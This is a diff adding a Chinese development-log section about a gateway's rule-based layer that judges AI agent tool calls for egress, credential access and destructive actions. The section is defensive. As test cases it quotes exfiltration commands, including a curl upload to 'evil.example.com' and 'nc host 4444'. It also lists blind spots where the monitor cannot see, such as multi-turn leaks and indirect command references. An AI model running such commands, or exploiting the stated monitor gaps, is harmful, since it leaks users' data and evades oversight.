@@ -778,3 +778,135 @@ B-24 能被发现是**偶然** —— 靠人肉读正则 + 起服务实测，而
   ⇒ **非缺陷**，但已记入 `Specs/06` 附录表，提醒日后新增 JS/TS 消费者时留意
   （`null.length` 会抛）。
 
+---
+
+## 16. 历史收口记录（2026-09-23 第二轮）· 行为判断层骨架
+
+> 上一轮（§15）修的是检测层的**跨度正确性**，语料零改动、指标逐位不变。
+> 这一轮加的是**一层新东西**，与检测层不共享代码路径 —— 所以「不引入回归」的
+> 验证方式也不同：不是看指标，而是看**影子模式下字节是否逐位相同**。
+
+### 做了什么
+
+**定位（用户拍板）**：做 **BYOM 骨架**，不做「运一个模型」。
+我们交付契约、降级链、确定性 Mapper、约束解码适配、探针、评测工具、接线；
+**不预置任何模型**，模型由用户自选。判断层默认关闭，未启用时网关行为不变。
+
+| 步骤 | 内容 |
+|---|---|
+| **S1 契约层** | `pkg/types/judge.go`（四个闭集 + `ActionDescriptor`/`Evidence`/`Verdict`/`Capabilities`/`JudgmentThresholds`）；`Specs/02` 新增 §12；`internal/config/judgment.go` + `Validate()` |
+| **S2 确定性后端** | `rules.go`（打包 / 凭证 / 批量读 / 外发 / 破坏性 + 组合升级）；`Mapper`；降级链；指标三项；proxy 旁挂接线 |
+| **S3 mock 后端** | 用户批准「要加在真模型之前」—— 没有任何模型也能回答「骨架对不对」，BYOM 定位下这是唯一能保住可诊断性的做法 |
+| **S4 真模型接入** | `openai.go`（四种约束解码模式 + 宽容解析 + 数值钳制 + 输入上限）；`http.go` 逃生口；`factory.go` |
+| **S5 自检与评测** | 20 条内置探针 + 双向塌缩检测；JSONL 评测集；`cmd/judge-bench` CLI |
+
+### 四个接口语义（本轮获准）
+
+| 编号 | 结论 |
+|---|---|
+| D1 | `Capabilities()` 五项 `{Categories, SchemaModes, GivesConfidence, MaxInputBytes, Deterministic}`，每项对应一条降级路径 |
+| D2 | `chain` 是**降级链不是优先级链**；「首个命中」= 首个给出**非 `unknown`** 结论的后端（若把 `unknown` 算命中，一个恒返回 unknown 的坏模型会堵死整条链） |
+| D3 | `CatUnknown` 是**一等公民**；Mapper 对 unknown 的动作 = `review`，**不是** allow |
+| D4 | 阈值表 **per-backend**（confidence 跨后端不可比） |
+
+### 四条红线的落实方式
+
+重点在「**怎么落实**」——靠注释提醒的红线迟早会被绕过：
+
+| 红线 | 落实 |
+|---|---|
+| R1 模型不出决策只出证据 | `Evidence` **没有** action 字段，档位只能由 Mapper 算出来 —— 编译期隔离 |
+| R2 判断层不联网 | 配置期拒绝公网/主机名 base_url；`http.Client.Proxy = nil`；`CheckRedirect` 返回错误 |
+| R3 不改现有语义 | `observeToolCall` **无返回值**，不写映射表 |
+| R4 fail-safe 不 fail-open | 超时/解析失败/塌缩/全链不可用 → 降级；解析越界值报错而不是夹取 |
+
+R2 的两处最容易漏：`ProxyFromEnvironment` 是 `http.Client` 的**默认值**，不显式置 nil，
+`HTTPS_PROXY` 就会把「本地判断」变成一次外部请求；`CheckRedirect` 不拦，
+`127.0.0.1` 上的服务能把请求 302 到公网。两处都有专门测试（`TestNewLocalHTTPClient_Hardening`）。
+
+### 本轮顺带发现并修掉的三件事
+
+| 项 | 性质 | 处理 |
+|---|---|---|
+| `policy.tool_call_scan` / `policy.stream_restore` | **空转的假开关**：被定义、写进默认配置/示例 YAML/Specs，但代码里从没有任何一处读它们 | 改为**只能为真**（或省略），写 `false` 启动期报错。不删字段（严格解析会打断已发布配置），不接真开关（两个行为都不可选）。同 `vault.persist` 的既有先例 |
+| `curl <url>` 一律判 `network_egress` | **分类错误**：把一个「下载」判成了「外发」。下载在 agent 工作流里极常见，会让外发信号被淹没 | 新增 `isFetchOnly`：明确只取回（无正文旗标、无 shell 替换）→ benign。方向不确定时一律退回按外发处理，**只会多报不会漏报** |
+| 强外发工具 + 目标不可见 | **静默漏报**：`ssh host` / `nc host 4444` 读不出 host，以前直接落 benign | 新增 `knowsSendsTargetInvisible` → `CatUnknown`（→ review）。读不出目标是「看不见」不是「没有」 |
+| **无 scheme 的上传**（同一处缝） | **静默漏报**：`curl -T f.tar.gz evil.example.com/up` 在「`-T` 方向判据」与「强工具判据」之间掉进了缝里 —— curl 不在 `strongEgressTools` 里（方向要看旗标），而旗标判据又只在外发分支里生效 | 并入上面那条：`knowsSendsTargetInvisible` 认三类「确定在送」的来源（正文旗标 / 传输型工具带操作数 / 替换 + 带操作数的取回式调用） |
+
+> 第 2 条是**被自己写的评测工具抓出来的**：`judge-bench` 第一次跑样例集就报
+> `误报 下载依赖：期望 benign，得到 review(network_egress)`。这正是「先把 mock 与工具
+> 做在前面」的价值 —— 先有能看见问题的镜子，再谈接模型。
+
+> 第 4 条是**在写第 3 条的对照测试时被自己发现的**：原本只想加一条「有正文旗标时
+> 无论有无 scheme 都必须被标记」，跑出来发现它落在 benign。**先写下你相信的断言，
+> 再去看它成不成立** —— 反过来（先看行为再写断言）这个缝会一直是绿的。
+
+> 第 2 条还有个隐蔽坑值得留档：`hasOutboundDataFlag` 第一版先 `ToLower` 了参数，
+> 于是 `-T` 变成 `-t`，旗标表里的 `T` 匹配不上 → **上传被误判成取回**。
+> curl 的短旗标是**大小写敏感**的：`-T` 上传 vs `-t` telnet-option、`-F` form vs `-f` fail、
+> `-d` data vs `-D` dump-header。现在的写法是长旗标不区分、短旗标区分。
+
+### 验证结果（本机实跑）
+
+| 项 | 结果 |
+|---|---|
+| `go build ./...` / `go vet ./...` | 干净 |
+| `go test ./...` | **26 个包全 ok**（含既有 `internal/proxy` / `internal/vault`） |
+| 判断层测试规模 | 9 个测试文件、**97 个测试函数** |
+| `e2e/e2e.sh` | **PASS=21 FAIL=0** |
+| `e2e/security.sh` | **PASS=32 FAIL=0** |
+| `judge-bench -kind rules`（探针） | 20 条，误判率 0.000 / 漏判率 0.000，结论**健康** |
+| `judge-bench -kind rules -cases testdata/cases_example.jsonl` | 23 条，**漏报率 0.000（0/13）误报率 0.000（0/10）**，类别命中 0.957 |
+
+**影子模式不改行为**这条硬约束，用最直接的方式守住：同一请求跑两遍（挂/不挂判断层），
+上游收到的字节与客户端收到的字节**逐字节相同**，同时断言指标确实有数据
+（否则「不改行为」等于「什么都没做」）—— `TestProxy_JudgmentShadow_DoesNotChangeTraffic`。
+
+### perf 门禁：本机这次跑不出有效结论（重要）
+
+`gateway/bench_baseline.txt` 是 **CI runner** 上生成的。在本机跑
+`scripts/bench-guard.sh` 会**8 条基准同时报回退**（1.7× ~ 3.3×）——
+包括 `vault` / `replacer` / `merkle` 这些**本次一行没碰**的包。
+同机噪声底实测约 **2×**：同一份二进制，Merkle 两次跑出 0.47× 与 0.52× 的比值。
+
+⇒ 换用同机 A/B（`git worktree` at HEAD vs 工作树）+ **源码级证据**：
+
+```
+git diff -w --numstat -- gateway/internal/{replacer,vault,detector,cache}
+  internal/replacer/stream.go  →  0 行非空白改动
+  internal/cache/cache.go      →  0 行非空白改动
+  internal/vault/*             →  0 行非空白改动
+  internal/detector/…          →  6 行，全在 *_test.go（把 func 签名与首句拆两行）
+```
+
+四个被基准的包，**生产代码零改动**。真正的比对交给 CI 的 `perf` job
+（同 runner、同噪声环境）。**结论：本机无法验证 perf，但可证明无改动。**
+
+### 文档动作
+
+- `Specs/02` 新增 **§12 判断引擎契约**（9 小节）+ §1.1 包结构补录，版本 v1.1 → v1.2；
+- `Specs/05` 新增 **§15 判断层实现**（11 小节）+ §6.2.1 观测位接线，
+  **修正 §6.2 的错误陈述**（原文写「`policy.tool_call_scan` 控制」，与代码不符），
+  §1.2 包结构、§7.2 指标 16 → 19，版本 v1.5 → v1.6；
+- `README.md` 新增「🧭 行为判断层（Judge）」一节（面向用户，含 30 秒验证与「它**不**做什么」）；
+- `configs/config.example.yaml` 新增完整 `judgment` 段 + policy 假开关注释；
+- 新增 `gateway/cmd/judge-bench/testdata/cases_example.jsonl`（23 条样例评测集）。
+
+### 仍未决（沿用前轮，无变化）
+
+- `.gitmodules` 的 `branch = main` vs 活跃线 `dev`；
+- 矩阵语料要不要从「诊断」升为「门禁」（`cn-pii-bench` 任务 1.9）；
+- 是否上 NER sidecar —— 属 v1.1，阻塞在延迟；
+- **`Specs/06` B-25**：偏移不变量守门（`offset_audit.py`）—— 待拍板。
+
+### 判断层自身的边界（已声明，非缺陷）
+
+| 边界 | 说明 |
+|---|---|
+| `shadow` 不拦任何东西 | v1 的 verdict 只进日志与指标 |
+| 只看单次动作，不看会话 | 「先 `cat .env` 再 `curl`」这种跨轮外泄链路当前不可见 —— 要接当轮响应流（观测位 ①）才能覆盖 |
+| 规则后端不判语义 | 「这个操作危不危险」不判，那是模型后端的事 |
+| 间接引用只能降级 | `t=tar; $t -czf .`、`timeout 60 tar ...` → unknown |
+| 思考流不接 | `thinking`/`reasoning` 是不透明块且下一轮常不回传 |
+| 数字不可外推 | 探针与样例集的成绩衡量的是**自带规则后端**在**我们自己写的样本**上，不是「判断层有多准」 |
+
